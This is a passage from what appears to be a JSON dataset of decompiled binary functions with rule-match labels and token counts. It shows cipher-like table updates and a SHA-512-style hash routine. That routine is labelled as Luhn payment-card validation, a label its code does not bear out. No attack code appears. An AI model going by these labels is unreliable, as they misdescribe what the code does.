*(arg_8h + 0x1080) = *(arg_8h + 0x1080) + 0x10U & 0x3ff;\n        *(arg_8h + 0x800 + uVar1 * 4) =\n             *(arg_8h + 0x800 + uVar1 * 4) + (*(arg_8h + 0x1058) >> 0x18 | *(arg_8h + 0x1058) << 8) +\n             ((*(arg_8h + 0x804 + uVar1 * 4) >> 9 | *(arg_8h + 0x804 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1074) >> 0x16 | *(arg_8h + 0x1074) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1050) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1050) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1040) = *(arg_8h + 0x800 + uVar1 * 4);\n        *(arg_8h + 0x804 + uVar1 * 4) =\n             *(arg_8h + 0x804 + uVar1 * 4) + (*(arg_8h + 0x105c) >> 0x18 | *(arg_8h + 0x105c) << 8) +\n             ((*(arg_8h + 0x808 + uVar1 * 4) >> 9 | *(arg_8h + 0x808 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1078) >> 0x16 | *(arg_8h + 0x1078) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1054) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1054) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1044) = *(arg_8h + 0x804 + uVar1 * 4);\n        *(arg_8h + 0x808 + uVar1 * 4) =\n             *(arg_8h + 0x808 + uVar1 * 4) + (*(arg_8h + 0x1060) >> 0x18 | *(arg_8h + 0x1060) << 8) +\n             ((*(arg_8h + 0x80c + uVar1 * 4) >> 9 | *(arg_8h + 0x80c + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x107c) >> 0x16 | *(arg_8h + 0x107c) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1058) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1058) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1048) = *(arg_8h + 0x808 + uVar1 * 4);\n        *(arg_8h + 0x80c + uVar1 * 4) =\n             *(arg_8h + 0x80c + uVar1 * 4) + (*(arg_8h + 0x1064) >> 0x18 | *(arg_8h + 0x1064) << 8) +\n             ((*(arg_8h + 0x810 + uVar1 * 4) >> 9 | *(arg_8h + 0x810 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1040) >> 0x16 | *(arg_8h + 0x1040) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x105c) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x105c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x104c) = *(arg_8h + 0x80c + uVar1 * 4);\n        *(arg_8h + 0x810 + uVar1 * 4) =\n             *(arg_8h + 0x810 + uVar1 * 4) + (*(arg_8h + 0x1068) >> 0x18 | *(arg_8h + 0x1068) << 8) +\n             ((*(arg_8h + 0x814 + uVar1 * 4) >> 9 | *(arg_8h + 0x814 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1044) >> 0x16 | *(arg_8h + 0x1044) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1060) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1060) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1050) = *(arg_8h + 0x810 + uVar1 * 4);\n        *(arg_8h + 0x814 + uVar1 * 4) =\n             *(arg_8h + 0x814 + uVar1 * 4) + (*(arg_8h + 0x106c) >> 0x18 | *(arg_8h + 0x106c) << 8) +\n             ((*(arg_8h + 0x818 + uVar1 * 4) >> 9 | *(arg_8h + 0x818 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1048) >> 0x16 | *(arg_8h + 0x1048) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1064) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1064) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1054) = *(arg_8h + 0x814 + uVar1 * 4);\n        *(arg_8h + 0x818 + uVar1 * 4) =\n             *(arg_8h + 0x818 + uVar1 * 4) + (*(arg_8h + 0x1070) >> 0x18 | *(arg_8h + 0x1070) << 8) +\n             ((*(arg_8h + 0x81c + uVar1 * 4) >> 9 | *(arg_8h + 0x81c + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x104c) >> 0x16 | *(arg_8h + 0x104c) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1068) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1068) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1058) = *(arg_8h + 0x818 + uVar1 * 4);\n        *(arg_8h + 0x81c + uVar1 * 4) =\n             *(arg_8h + 0x81c + uVar1 * 4) + (*(arg_8h + 0x1074) >> 0x18 | *(arg_8h + 0x1074) << 8) +\n             ((*(arg_8h + 0x820 + uVar1 * 4) >> 9 | *(arg_8h + 0x820 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1050) >> 0x16 | *(arg_8h + 0x1050) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x106c) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x106c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x105c) = *(arg_8h + 0x81c + uVar1 * 4);\n        *(arg_8h + 0x820 + uVar1 * 4) =\n             *(arg_8h + 0x820 + uVar1 * 4) + (*(arg_8h + 0x1078) >> 0x18 | *(arg_8h + 0x1078) << 8) +\n             ((*(arg_8h + 0x824 + uVar1 * 4) >> 9 | *(arg_8h + 0x824 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1054) >> 0x16 | *(arg_8h + 0x1054) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1070) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1070) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1060) = *(arg_8h + 0x820 + uVar1 * 4);\n        *(arg_8h + 0x824 + uVar1 * 4) =\n             *(arg_8h + 0x824 + uVar1 * 4) + (*(arg_8h + 0x107c) >> 0x18 | *(arg_8h + 0x107c) << 8) +\n             ((*(arg_8h + 0x828 + uVar1 * 4) >> 9 | *(arg_8h + 0x828 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1058) >> 0x16 | *(arg_8h + 0x1058) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1074) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1074) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1064) = *(arg_8h + 0x824 + uVar1 * 4);\n        *(arg_8h + 0x828 + uVar1 * 4) =\n             *(arg_8h + 0x828 + uVar1 * 4) + (*(arg_8h + 0x1040) >> 0x18 | *(arg_8h + 0x1040) << 8) +\n             ((*(arg_8h + 0x82c + uVar1 * 4) >> 9 | *(arg_8h + 0x82c + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x105c) >> 0x16 | *(arg_8h + 0x105c) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1078) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1078) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1068) = *(arg_8h + 0x828 + uVar1 * 4);\n        *(arg_8h + 0x82c + uVar1 * 4) =\n             *(arg_8h + 0x82c + uVar1 * 4) + (*(arg_8h + 0x1044) >> 0x18 | *(arg_8h + 0x1044) << 8) +\n             ((*(arg_8h + 0x830 + uVar1 * 4) >> 9 | *(arg_8h + 0x830 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1060) >> 0x16 | *(arg_8h + 0x1060) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x107c) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x107c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x106c) = *(arg_8h + 0x82c + uVar1 * 4);\n        *(arg_8h + 0x830 + uVar1 * 4) =\n             *(arg_8h + 0x830 + uVar1 * 4) + (*(arg_8h + 0x1048) >> 0x18 | *(arg_8h + 0x1048) << 8) +\n             ((*(arg_8h + 0x834 + uVar1 * 4) >> 9 | *(arg_8h + 0x834 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1064) >> 0x16 | *(arg_8h + 0x1064) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1040) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1040) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1070) = *(arg_8h + 0x830 + uVar1 * 4);\n        *(arg_8h + 0x834 + uVar1 * 4) =\n             *(arg_8h + 0x834 + uVar1 * 4) + (*(arg_8h + 0x104c) >> 0x18 | *(arg_8h + 0x104c) << 8) +\n             ((*(arg_8h + 0x838 + uVar1 * 4) >> 9 | *(arg_8h + 0x838 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1068) >> 0x16 | *(arg_8h + 0x1068) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1044) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1044) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1074) = *(arg_8h + 0x834 + uVar1 * 4);\n        *(arg_8h + 0x838 + uVar1 * 4) =\n             *(arg_8h + 0x838 + uVar1 * 4) + (*(arg_8h + 0x1050) >> 0x18 | *(arg_8h + 0x1050) << 8) +\n             ((*(arg_8h + 0x83c + uVar1 * 4) >> 9 | *(arg_8h + 0x83c + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x106c) >> 0x16 | *(arg_8h + 0x106c) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1048) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1048) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1078) = *(arg_8h + 0x838 + uVar1 * 4);\n        *(arg_8h + 0x83c + uVar1 * 4) =\n             *(arg_8h + 0x83c + uVar1 * 4) + (*(arg_8h + 0x1054) >> 0x18 | *(arg_8h + 0x1054) << 8) +\n             ((*(arg_8h + 0x800 + uVar2 * 4) >> 9 | *(arg_8h + 0x800 + uVar2 * 4) << 0x17) ^\n             (*(arg_8h + 0x1070) >> 0x16 | *(arg_8h + 0x1070) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x104c) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x104c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x107c) = *(arg_8h + 0x83c + uVar1 * 4);\n    }\n    return;\n}\n",
        "token_count": 9303
    },
    "00410be0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410be0(uint32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    bool bVar13;\n    uint var_498h;\n    uint var_494h;\n    uint var_490h;\n    uint var_48ch;\n    uint var_450h;\n    uint var_44ch;\n    uint var_428h;\n    uint var_424h;\n    uint var_418h;\n    uint var_414h;\n    uint var_410h;\n    uint var_40ch;\n    uint var_408h;\n    uint var_404h;\n    uint var_400h;\n    uint var_3fch;\n    uint var_3f8h;\n    uint var_3f4h;\n    uint var_3f0h;\n    uint var_3ech;\n    uint var_3e8h;\n    uint var_3e4h;\n    uint var_3e0h;\n    uint var_3dch;\n    int32_t aiStack980 [142];\n    int32_t var_198h;\n    uint32_t var_194h;\n    uint32_t var_190h;\n    uint32_t var_18ch;\n    uint32_t var_188h;\n    uint32_t var_184h;\n    uint32_t var_180h;\n    uint32_t var_17ch;\n    uint32_t var_178h;\n    uint32_t var_174h;\n    uint32_t var_170h;\n    uint32_t var_16ch;\n    uint32_t var_168h;\n    uint32_t var_164h;\n    uint32_t var_160h;\n    uint32_t var_15ch;\n    uint32_t var_158h;\n    uint32_t var_154h;\n    uint32_t var_150h;\n    uint32_t var_14ch;\n    uint32_t var_148h;\n    uint32_t var_144h;\n    uint32_t var_140h;\n    uint32_t var_13ch;\n    uint32_t var_138h;\n    uint32_t var_134h;\n    uint32_t var_130h;\n    uint32_t var_12ch;\n    uint32_t var_128h;\n    uint32_t var_124h;\n    uint32_t var_120h;\n    uint32_t var_11ch;\n    uint32_t var_118h;\n    uint32_t var_114h;\n    uint32_t var_110h;\n    uint32_t var_10ch;\n    uint32_t var_108h;\n    uint32_t var_104h;\n    uint32_t var_100h;\n    uint32_t var_fch;\n    uint32_t var_f8h;\n    uint32_t var_f4h;\n    uint32_t var_f0h;\n    uint32_t var_ech;\n    uint32_t var_e8h;\n    uint32_t var_e4h;\n    uint32_t var_e0h;\n    uint32_t var_dch;\n    uint32_t var_d8h;\n    uint32_t var_d4h;\n    uint32_t var_d0h;\n    uint32_t var_cch;\n    uint32_t var_c8h;\n    uint32_t var_c4h;\n    uint32_t var_c0h;\n    uint32_t var_bch;\n    uint32_t var_b8h;\n    uint32_t var_b4h;\n    uint32_t var_b0h;\n    uint32_t var_ach;\n    uint32_t var_a8h;\n    uint32_t var_a4h;\n    uint32_t var_a0h;\n    uint32_t var_9ch;\n    uint32_t var_98h;\n    uint32_t var_94h;\n    uint32_t var_90h;\n    uint32_t var_8ch;\n    uint32_t var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint32_t var_64h;\n    uint32_t var_60h;\n    uint32_t var_5ch;\n    uint32_t var_58h;\n    uint32_t var_54h;\n    uint32_t var_50h;\n    uint32_t var_4ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint32_t var_40h;\n    uint32_t var_3ch;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    for (var_1ch = 0; var_1ch < 0x10; var_1ch = var_1ch + 1) {\n        uVar1 = *(arg_ch + 4 + var_1ch * 8);\n        (&var_418h)[var_1ch * 2] = *(arg_ch + var_1ch * 8);\n        (&var_414h)[var_1ch * 2] = uVar1;\n    }\n    for (var_1ch = 0x10; var_1ch < 0x50; var_1ch = var_1ch + 1) {\n        uVar2 = ((&var_48ch)[var_1ch * 2] >> 1 | (&var_490h)[var_1ch * 2] << 0x1f) ^\n                ((&var_48ch)[var_1ch * 2] >> 8 | (&var_490h)[var_1ch * 2] << 0x18) ^\n                ((&var_48ch)[var_1ch * 2] >> 7 | (&var_490h)[var_1ch * 2] << 0x19);\n        var_194h = uVar2 + (((&var_424h)[var_1ch * 2] >> 0x13 | (&var_428h)[var_1ch * 2] << 0xd) ^\n                            ((&var_428h)[var_1ch * 2] >> 0x1d | (&var_424h)[var_1ch * 2] << 3) ^\n                           ((&var_424h)[var_1ch * 2] >> 6 | (&var_428h)[var_1ch * 2] << 0x1a));\n        var_148h = var_194h < uVar2;\n        var_198h = (((&var_490h)[var_1ch * 2] >> 1 | (&var_48ch)[var_1ch * 2] << 0x1f) ^\n                    ((&var_490h)[var_1ch * 2] >> 8 | (&var_48ch)[var_1ch * 2] << 0x18) ^ (&var_490h)[var_1ch * 2] >> 7)\n                   + (((&var_428h)[var_1ch * 2] >> 0x13 | (&var_424h)[var_1ch * 2] << 0xd) ^\n                      ((&var_424h)[var_1ch * 2] >> 0x1d | (&var_428h)[var_1ch * 2] << 3) ^ (&var_428h)[var_1ch * 2] >> 6\n                     ) + var_148h;\n        var_154h = (&var_44ch)[var_1ch * 2] + var_194h < (&var_44ch)[var_1ch * 2];\n        (&var_414h)[var_1ch * 2] = (&var_494h)[var_1ch * 2] + (&var_44ch)[var_1ch * 2] + var_194h;\n        var_158h = (&var_414h)[var_1ch * 2] < (&var_494h)[var_1ch * 2];\n        (&var_418h)[var_1ch * 2] = (&var_498h)[var_1ch * 2] + (&var_450h)[var_1ch * 2] + var_198h + var_154h + var_158h;\n    }\n    var_34h = *arg_8h;\n    var_30h = arg_8h[1];\n    var_3ch = arg_8h[2];\n    var_38h = arg_8h[3];\n    var_44h = arg_8h[4];\n    var_40h = arg_8h[5];\n    var_2ch = arg_8h[6];\n    var_28h = arg_8h[7];\n    var_4ch = arg_8h[8];\n    var_48h = arg_8h[9];\n    var_54h = arg_8h[10];\n    var_50h = arg_8h[0xb];\n    var_5ch = arg_8h[0xc];\n    var_58h = arg_8h[0xd];\n    var_64h = arg_8h[0xe];\n    var_60h = arg_8h[0xf];\n    for (var_1ch = 0; var_1ch < 0x50; var_1ch = var_1ch + 8) {\n        uVar2 = ~var_48h & var_58h ^ var_48h & var_50h;\n        uVar5 = uVar2 + ((var_48h >> 0xe | var_4ch << 0x12) ^ (var_48h >> 0x12 | var_4ch << 0xe) ^\n                        (var_4ch >> 9 | var_48h << 0x17));\n        var_15ch = uVar5 < uVar2;\n        uVar5 = *(var_1ch * 8 + 0x40416c) + uVar5;\n        var_160h = uVar5 < *(var_1ch * 8 + 0x40416c);\n        uVar5 = (&var_414h)[var_1ch * 2] + uVar5;\n        var_164h = uVar5 < (&var_414h)[var_1ch * 2];\n        uVar5 = var_60h + uVar5;\n        var_168h = uVar5 < var_60h;\n        iVar3 = var_64h + (&var_418h)[var_1ch * 2] +\n                          *(var_1ch * 8 + 0x404168) +\n                          (~var_4ch & var_5ch ^ var_4ch & var_54h) +\n                          ((var_4ch >> 0xe | var_48h << 0x12) ^ (var_4ch >> 0x12 | var_48h << 0xe) ^\n                          (var_48h >> 9 | var_4ch << 0x17)) + var_15ch + var_160h + var_164h + var_168h;\n        uVar2 = (var_30h >> 0x1c | var_34h << 4) ^ (var_34h >> 2 | var_30h << 0x1e) ^ (var_34h >> 7 | var_30h << 0x19);\n        uVar4 = uVar2 + (var_30h & var_38h ^ var_30h & var_40h ^ var_38h & var_40h);\n        var_16ch = uVar4 < uVar2;\n        uVar2 = var_28h + uVar5;\n        var_174h = uVar2 < var_28h;\n        var_174h = var_2ch + iVar3 + var_174h;\n        uVar4 = uVar5 + uVar4;\n        var_178h = uVar4 < uVar5;\n        var_178h = iVar3 + ((var_34h >> 0x1c | var_30h << 4) ^ (var_30h >> 2 | var_34h << 0x1e) ^\n                           (var_30h >> 7 | var_34h << 0x19)) +\n                           (var_34h & var_3ch ^ var_34h & var_44h ^ var_3ch & var_44h) + var_16ch + var_178h;\n        uVar5 = ~uVar2 & var_50h ^ uVar2 & var_48h;\n        uVar9 = uVar5 + ((uVar2 >> 0xe | var_174h * 0x40000) ^ (uVar2 >> 0x12 | var_174h * 0x4000) ^\n                        (var_174h >> 9 | uVar2 * 0x800000));\n        var_17ch = uVar9 < uVar5;\n        uVar9 = *(var_1ch * 8 + 0x404174) + uVar9;\n        bVar13 = *(var_1ch * 8 + 0x404174) <= uVar9;\n        if (bVar13) {\n            var_180h = 0;\n        }\n        else {\n            var_180h = 1;\n        }\n        var_180h = !bVar13;\n        uVar9 = (&var_40ch)[var_1ch * 2] + uVar9;\n        if ((&var_40ch)[var_1ch * 2] <= uVar9) {\n            var_184h = 0;\n        }\n        else {\n            var_184h = 1;\n        }\n        var_184h = (&var_40ch)[var_1ch * 2] > uVar9;\n        uVar9 = var_58h + uVar9;\n        if (var_58h <= uVar9) {\n            var_188h = 0;\n        }\n        else {\n            var_188h = 1;\n        }\n        var_188h = var_58h > uVar9;\n        iVar3 = var_5ch + (&var_410h)[var_1ch * 2] +\n                          *(var_1ch * 8 + 0x404170) +\n                          (~var_174h & var_54h ^ var_174h & var_4ch) +\n                          ((var_174h >> 0xe | uVar2 * 0x40000) ^ (var_174h >> 0x12 | uVar2 * 0x4000) ^\n                          (uVar2 >> 9 | var_174h * 0x800000)) + var_17ch + var_180h + var_184h + var_188h;\n        uVar6 = (uVar4 >> 0x1c | var_178h * 0x10) ^ (var_178h >> 2 | uVar4 * 0x40000000) ^\n                (var_178h >> 7 | uVar4 * 0x2000000);\n        uVar5 = uVar6 + (uVar4 & var_30h ^ uVar4 & var_38h ^ var_30h & var_38h);\n        if (uVar6 <= uVar5) {\n            var_18ch = 0;\n        }\n        else {\n            var_18ch = 1;\n        }\n        var_18ch = uVar6 > uVar5;\n        uVar6 = var_40h + uVar9;\n        if (var_40h <= uVar6) {\n            var_190h = 0;\n        }\n        else {\n            var_190h = 1;\n        }\n        var_190h = var_40h > uVar6;\n        var_190h = var_44h + iVar3 + var_190h;\n        uVar5 = uVar9 + uVar5;\n        var_88h = uVar5 < uVar9;\n        var_88h = iVar3 + ((var_178h >> 0x1c | uVar4 * 0x10) ^ (uVar4 >> 2 | var_178h * 0x40000000) ^\n                          (uVar4 >> 7 | var_178h * 0x2000000)) +\n                          (var_178h & var_34h ^ var_178h & var_3ch ^ var_34h & var_3ch) + var_18ch + var_88h;\n        uVar7 = ~uVar6 & var_48h ^ uVar6 & uVar2;\n        uVar9 = uVar7 + ((uVar6 >> 0xe | var_190h * 0x40000) ^ (uVar6 >> 0x12 | var_190h * 0x4000) ^\n                        (var_190h >> 9 | uVar6 * 0x800000));\n        var_8ch = uVar9 < uVar7;\n        uVar9 = *(var_1ch * 8 + 0x40417c) + uVar9;\n        var_90h = uVar9 < *(var_1ch * 8 + 0x40417c);\n        uVar9 = (&var_404h)[var_1ch * 2] + uVar9;\n        var_94h = uVar9 < (&var_404h)[var_1ch * 2];\n        uVar9 = var_50h + uVar9;\n        var_98h = uVar9 < var_50h;\n        iVar3 = var_54h + (&var_408h)[var_1ch * 2] +\n                          *(var_1ch * 8 + 0x404178) +\n                          (~var_190h & var_4ch ^ var_190h & var_174h) +\n                          ((var_190h >> 0xe | uVar6 * 0x40000) ^ (var_190h >> 0x12 | uVar6 * 0x4000) ^\n                          (uVar6 >> 9 | var_190h * 0x800000)) + var_8ch + var_90h + var_94h + var_98h;\n        uVar7 = (uVar5 >> 0x1c | var_88h * 0x10) ^ (var_88h >> 2 | uVar5 * 0x40000000) ^\n                (var_88h >> 7 | uVar5 * 0x2000000);\n        uVar10 = uVar7 + (uVar5 & uVar4 ^ uVar5 & var_30h ^ uVar4 & var_30h);\n        var_9ch = uVar10 < uVar7;\n        uVar11 = var_38h + uVar9;\n        var_a0h = uVar11 < var_38h;\n        var_a0h = var_3ch + iVar3 + var_a0h;\n        uVar10 = uVar9 + uVar10;\n        var_a4h = uVar10 < uVar9;\n        var_a4h = iVar3 + ((var_88h >> 0x1c | uVar5 * 0x10) ^ (uVar5 >> 2 | var_88h * 0x40000000) ^\n                          (uVar5 >> 7 | var_88h * 0x2000000)) +\n                          (var_88h & var_178h ^ var_88h & var_34h ^ var_178h & var_34h) + var_9ch + var_a4h;\n        uVar9 = ~uVar11 & uVar2 ^ uVar11 & uVar6;\n        uVar8 = uVar9 + ((uVar11 >> 0xe | var_a0h * 0x40000) ^ (uVar11 >> 0x12 | var_a0h * 0x4000) ^\n                        (var_a0h >> 9 | uVar11 * 0x800000));\n        var_a8h = uVar8 < uVar9;\n        uVar8 = *(var_1ch * 8 + 0x404184) + uVar8;\n        var_ach = uVar8 < *(var_1ch * 8 + 0x404184);\n        uVar8 = (&var_3fch)[var_1ch * 2] + uVar8;\n        var_b0h = uVar8 < (&var_3fch)[var_1ch * 2];\n        uVar8 = var_48h + uVar8;\n        var_b4h = uVar8 < var_48h;\n        iVar3 = var_4ch + (&var_400h)[var_1ch * 2] +\n                          *(var_1ch * 8 + 0x404180) +\n                          (~var_a0h & var_174h ^ var_a0h & var_190h) +\n                          ((var_a0h >> 0xe | uVar11 * 0x40000) ^ (var_a0h >> 0x12 | uVar11 * 0x4000) ^\n                          (uVar11 >> 9 | var_a0h * 0x800000)) + var_a8h + var_ach + var_b0h + var_b4h;\n        uVar9 = (uVar10 >> 0x1c | var_a4h * 0x10) ^ (var_a4h >> 2 | uVar10 * 0x40000000) ^\n                (var_a4h >> 7 | uVar10 * 0x2000000);\n        uVar7 = uVar9 + (uVar10 & uVar5 ^ uVar10 & uVar4 ^ uVar5 & uVar4);\n        var_b8h = uVar7 < uVar9;\n        uVar9 = var_30h + uVar8;\n        var_bch = uVar9 < var_30h;\n        var_bch = var_34h + iVar3 + var_bch;\n        uVar7 = uVar8 + uVar7;\n        var_c0h = uVar7 < uVar8;\n        var_c0h = iVar3 + ((var_a4h >> 0x1c | uVar10 * 0x10) ^ (uVar10 >> 2 | var_a4h * 0x40000000) ^\n                          (uVar10 >> 7 | var_a4h * 0x2000000)) +\n                          (var_a4h & var_88h ^ var_a4h & var_178h ^ var_88h & var_178h) + var_b8h + var_c0h;\n        uVar8 = ~uVar9 & uVar6 ^ uVar9 & uVar11;\n        uVar12 = uVar8 + ((uVar9 >> 0xe | var_bch * 0x40000) ^ (uVar9 >> 0x12 | var_bch * 0x4000) ^\n                         (var_bch >> 9 | uVar9 * 0x800000));\n        var_c4h = uVar12 < uVar8;\n        uVar12 = *(var_1ch * 8 + 0x40418c) + uVar12;\n        var_c8h = uVar12 < *(var_1ch * 8 + 0x40418c);\n        uVar12 = (&var_3f4h)[var_1ch * 2] + uVar12;\n        var_cch = uVar12 < (&var_3f4h)[var_1ch * 2];\n        uVar12 = uVar2 + uVar12;\n        var_d0h = uVar12 < uVar2;\n        iVar3 = var_174h +\n                (&var_3f8h)[var_1ch * 2] +\n                *(var_1ch * 8 + 0x404188) +\n                (~var_bch & var_190h ^ var_bch & var_a0h) +\n                ((var_bch >> 0xe | uVar9 * 0x40000) ^ (var_bch >> 0x12 | uVar9 * 0x4000) ^\n                (uVar9 >> 9 | var_bch * 0x800000)) + var_c4h + var_c8h + var_cch + var_d0h;\n        uVar2 = (uVar7 >> 0x1c | var_c0h * 0x10) ^ (var_c0h >> 2 | uVar7 * 0x40000000) ^\n                (var_c0h >> 7 | uVar7 * 0x2000000);\n        var_28h = uVar2 + (uVar7 & uVar10 ^ uVar7 & uVar5 ^ uVar10 & uVar5);\n        var_d4h = var_28h < uVar2;\n        var_60h = uVar4 + uVar12;\n        var_d8h = var_60h < uVar4;\n        var_64h = var_178h + iVar3 + var_d8h;\n        var_28h = uVar12 + var_28h;\n        var_dch = var_28h < uVar12;\n        var_2ch = iVar3 + ((var_c0h >> 0x1c | uVar7 * 0x10) ^ (uVar7 >> 2 | var_c0h * 0x40000000) ^\n                          (uVar7 >> 7 | var_c0h * 0x2000000)) +\n                          (var_c0h & var_a4h ^ var_c0h & var_88h ^ var_a4h & var_88h) + var_d4h + var_dch;\n        uVar4 = ~var_60h & uVar11 ^ var_60h & uVar9;\n        uVar2 = uVar4 + ((var_60h >> 0xe | var_64h * 0x40000) ^ (var_60h >> 0x12 | var_64h * 0x4000) ^\n                        (var_64h >> 9 | var_60h * 0x800000));\n        var_e0h = uVar2 < uVar4;\n        uVar2 = *(var_1ch * 8 + 0x404194) + uVar2;\n        var_e4h = uVar2 < *(var_1ch * 8 + 0x404194);\n        uVar2 = (&var_3ech)[var_1ch * 2] + uVar2;\n        var_e8h = uVar2 < (&var_3ech)[var_1ch * 2];\n        uVar2 = uVar6 + uVar2;\n        var_ech = uVar2 < uVar6;\n        iVar3 = var_190h +\n                (&var_3f0h)[var_1ch * 2] +\n                *(var_1ch * 8 + 0x404190) +\n                (~var_64h & var_a0h ^ var_64h & var_bch) +\n                ((var_64h >> 0xe | var_60h * 0x40000) ^ (var_64h >> 0x12 | var_60h * 0x4000) ^\n                (var_60h >> 9 | var_64h * 0x800000)) + var_e0h + var_e4h + var_e8h + var_ech;\n        uVar4 = (var_28h >> 0x1c | var_2ch * 0x10) ^ (var_2ch >> 2 | var_28h * 0x40000000) ^\n                (var_2ch >> 7 | var_28h * 0x2000000);\n        var_40h = uVar4 + (var_28h & uVar7 ^ var_28h & uVar10 ^ uVar7 & uVar10);\n        var_f0h = var_40h < uVar4;\n        var_58h = uVar5 + uVar2;\n        var_f4h = var_58h < uVar5;\n        var_5ch = var_88h + iVar3 + var_f4h;\n        var_40h = uVar2 + var_40h;\n        var_f8h = var_40h < uVar2;\n        var_44h = iVar3 + ((var_2ch >> 0x1c | var_28h * 0x10) ^ (var_28h >> 2 | var_2ch * 0x40000000) ^\n                          (var_28h >> 7 | var_2ch * 0x2000000)) +\n                          (var_2ch & var_c0h ^ var_2ch & var_a4h ^ var_c0h & var_a4h) + var_f0h + var_f8h;\n        uVar2 = ~var_58h & uVar9 ^ var_58h & var_60h;\n        uVar4 = uVar2 + ((var_58h >> 0xe | var_5ch * 0x40000) ^ (var_58h >> 0x12 | var_5ch * 0x4000) ^\n                        (var_5ch >> 9 | var_58h * 0x800000));\n        var_fch = uVar4 < uVar2;\n        uVar4 = *(var_1ch * 8 + 0x40419c) + uVar4;\n        var_100h = uVar4 < *(var_1ch * 8 + 0x40419c);\n        uVar4 = (&var_3e4h)[var_1ch * 2] + uVar4;\n        var_104h = uVar4 < (&var_3e4h)[var_1ch * 2];\n        uVar4 = uVar11 + uVar4;\n        var_108h = uVar4 < uVar11;\n        iVar3 = var_a0h + (&var_3e8h)[var_1ch * 2] +\n                          *(var_1ch * 8 + 0x404198) +\n                          (~var_5ch & var_bch ^ var_5ch & var_64h) +\n                          ((var_5ch >> 0xe | var_58h * 0x40000) ^ (var_5ch >> 0x12 | var_58h * 0x4000) ^\n                          (var_58h >> 9 | var_5ch * 0x800000)) + var_fch + var_100h + var_104h + var_108h;\n        uVar2 